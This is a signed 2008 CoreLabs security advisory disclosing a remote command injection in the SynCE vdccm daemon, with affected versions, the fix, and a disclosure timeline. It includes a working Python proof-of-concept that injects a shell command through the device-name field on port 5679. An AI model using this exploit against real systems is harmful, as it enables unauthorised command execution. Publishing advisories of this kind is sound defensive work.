-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


   Core Security Technologies â€“ CoreLabs Advisory
        http://www.coresecurity.com/corelabs


          SynCE Remote Command Injection

*Advisory Information*

Title: SynCE Remote Command Injection
Advisory ID:  CORE-2007-1106
Advisory URL: http://www.coresecurity.com/?action=item&id=2070
Date published: 2008-01-07
Date of last update: 2008-01-03
Vendors contacted: SynCE team
Release mode: Coordinated release

*Vulnerability Information*

Class: Input validation error
Remotely Exploitable: Yes
Locally Exploitable: Yes
Bugtraq ID: N/A
CVE Name: N/A

*Vulnerability Description*

SynCE is an open source project, whose objective is to provide a way of
communicating with a Windows CE or Pocket PC device, from a computer
running Linux, *BSD or other unices. For more information see
http://www.synce.org/

The vdccm daemon (part of the SynCE package) is vulnerable to a remote
command injection, which can be exploited by malicious remote attackers.
The vulnerability is due to the vdccm daemon not properly sanitizing
certain input before using it to invoke external scripts. This can be
exploited to execute arbitrary commands with the privileges of the vdccm
daemon by sending specially crafted requests.

*Vulnerable packages*

. Synce-dccm since version 0.92

*Non-vulnerable packages*

. Synce-dccm 0.91 and earlier.
. SynCE-dccm 0.10.1

*Vendor Information, Solutions and Workarounds*

This vulnerability has been fixed in SynCE-dccm 0.10.1, available at
http://sourceforge.net/projects/synce/.

*Credits*

This vulnerability was discovered and researched by Alfredo Ortega and
Oren Isacson from Core Security Technologies.

*Technical Description / Proof of Concept Code*

The vdccm daemon listens on port 5679 for incoming connections from a
Windows CE device.
The command injection exist on the name of the connected device. The
code at src/utils.cpp, function  Utils::runScripts  contains the
following code:

string command = string(path) + " " + action + " " + deviceName;
system(command.c_str());

The contents of the string variable "deviceName" is controlled by the
attacker.

The next python proof of concept script will remotely create an empty
file named "/tmp/vulnerability" when used on a FreeBSD host running the
vulnerable daemon.

- ---------------------------
import socket, struct
import time
def AtoWChar(string):
    return ''.join([x+chr(0) for x in string])

HOST = '192.168.XXX.XXX'
PORT = 5679
c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((HOST, PORT))
buf="\x00"*0x18
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+="\x00"*12
string=AtoWChar("&/usr/bin/touch /tmp/vulnerability")
buf+=string+"\x00\x00"+"\x00"*12
c.send(struct.pack("L",63+len(string))+buf+"\x00" )
- ---------------------------

NOTE: for this proof of concept to work, a script file is needed on the
"$home$/.synce/scripts" directory. Some linux distributions ship with
scripts on this directory by default.

*Report Timeline*

2007-11-12: Core notifies the SynCE team of the vulnerability.
2007-11-13: Technical details sent by Core to SynCE team.
2007-11-22: SynCE notifies Core that a fix has been produced, and will
be released in the next SynCE official release.
2007-12-20: SynCE releases version 0.10.1, which fixes this vulnerability.
2008-01-07: CORE-2007-1106 advisory is published.

*References*

http://synce.sourceforge.net/synce/dccm.php
http://synce.sourceforge.net/synce/architecture.php

*About Corelabs*

CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies.
We conduct our research in several important areas of computer security
including system vulnerabilities, cyber attack planning and simulation,
source code auditing, and cryptography. Our results include problem
formalization, identification of vulnerabilities, novel solutions and
prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
http://www.coresecurity.com/corelabs/

*About Core Security Technologies*

Core Security Technologies develops strategic solutions that help
security-conscious organizations worldwide develop and maintain a
proactive process for securing their networks. The company's flagship
product, CORE IMPACT, is the most comprehensive product for performing
enterprise security assurance testing. IMPACT evaluates network,
endpoint and end-user vulnerabilities and identifies what resources are
exposed. It enables organizations to determine if current security
investments are detecting and preventing attacks. Core augments its
leading technology solution with world-class security consulting
services, including penetration testing and software security auditing.
Based in Boston, MA and Buenos Aires, Argentina, Core Security
Technologies can be reached at 617-399-6980 or on the Web at
http://www.coresecurity.com

*DISCLAIMER*

The contents of this advisory are copyright (c) 2008 CORE Security
Technologies and (c) 2008 CoreLabs, and may be distributed freely
provided that no fee is charged for this distribution and proper credit
is given.

*PGP/GPG KEYS*

This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFHgn8ryNibggitWa0RApswAJ9ey+xpJ3XMB4UNJyVX8y8riyNOdQCfQgAR
DddKr++Y5HTDdBlzOd/vjRw=
=c7rd
-----END PGP SIGNATURE-----
